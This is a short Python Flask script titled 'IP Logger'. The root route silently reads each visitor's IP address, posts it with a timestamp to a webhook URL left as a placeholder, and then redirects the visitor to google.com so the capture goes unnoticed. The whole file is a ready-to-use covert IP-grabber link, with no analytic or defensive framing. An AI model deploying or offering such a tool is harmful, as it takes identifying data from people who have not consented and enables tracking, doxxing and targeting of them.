from flask import Flask, request, redirect
from datetime import datetime
import requests

app = Flask(__name__)

def send_ip_to_webhook(ip, date):
    webhook_url = "PASTE YOUR WEBHOOK HERE"
    
    data = {
        "content": "",
        "embeds": [
            {
                "title": "IP Logger",
                "fields": [
                    {"name": "IP Address", "value": ip, "inline": False},
                    {"name": "Timestamp", "value": date, "inline": False}
                ]
            }
        ]
    }

    try:
        response = requests.post(webhook_url, json=data)
        print(f"Webhook response: {response.status_code}, Response text: {response.text}")  # Log the response
        return response.status_code == 200
    except requests.exceptions.RequestException as e:
        print(f"Error sending webhook request: {e}")
        return False

@app.route("/")
def index():
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")

    print(f"IP pulled: {ip}, Date: {date}")  
    
    if not ip:
        print("Error: IP address not found")
        return "Error: IP address not found", 400

    if send_ip_to_webhook(ip, date):
        print("Webhook sent successfully!")
    else:
        print("Failed to send webhook.")

    return redirect("https://google.com")

if __name__ == "__main__":
    app.run(host="0.0.0.0") 
